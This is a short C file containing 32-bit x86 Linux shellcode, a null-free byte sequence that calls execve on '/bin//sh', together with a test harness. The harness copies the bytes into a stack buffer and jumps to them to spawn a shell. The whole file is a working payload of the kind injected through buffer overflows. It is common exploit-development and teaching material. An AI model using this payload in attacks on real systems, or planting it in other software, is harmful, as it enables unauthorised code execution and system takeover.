#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"
;

int main(){
	char buf[sizeof(code)];
	strcpy(buf, code);
	((void(*)( ))buf)( );
}